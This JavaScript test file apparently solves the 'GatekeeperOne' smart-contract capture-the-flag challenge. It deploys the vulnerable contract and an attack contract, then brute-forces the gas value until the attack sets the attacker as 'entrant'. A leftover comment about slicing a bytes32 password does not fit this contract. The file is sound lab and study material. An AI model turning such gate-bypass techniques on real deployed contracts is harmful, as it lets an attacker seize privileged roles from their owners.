// test/GatekeeperOne.test.js

// load dependencies
const { expect } = require('chai');

// import utils from test helpers
const { BN, expectEvent, expectRevert } = require('@openzeppelin/test-helpers');

// load compiled artifacts
const GatekeeperOne = artifacts.require('GatekeeperOne');
const GatekeeperOneAttack = artifacts.require('GatekeeperOneAttack');

// start test block
contract('GatekeeperOne', function ([ owner, other ]) {

  beforeEach(async function () {
    this.vulnContract   = await GatekeeperOne.new({ from: owner });
    this.attackContract = await GatekeeperOneAttack.new(this.vulnContract.address, {from: other});
    // verify initial state
    expect(await this.vulnContract.entrant).to.not.equal(other);
  });

  it('test attack: bypass 3 gates to set entrant to user address', async function () {
    // bytes32 has 66 characters
    // first two characters 0x then 64 characters for content (1 byte = 2 characters)
    // vulnContract compares input vs bytes16 (first 32 characters)
    // so slice the string by 2 (for "0x" prefix) + 32 (first 32 characters after prefix) = 34
    //await this.attackContract.attack(extractedPass.slice(0, 34), {from: other});

    console.log("Brute forcing correct gas...");
    const MOD      = 8191;
    const gasToUse = 800000;
    let correctGas = 0;

    for(let i = 0; i < MOD; i++) {
      try {
        tx = await this.attackContract.attack((gasToUse + i), {from: other});
        correctGas = gasToUse+i;
        break;
      } catch {}
    }

    console.log(`correct gas: ${correctGas}`);
    expect(await this.vulnContract.entrant()).to.equal(other);
  });
});
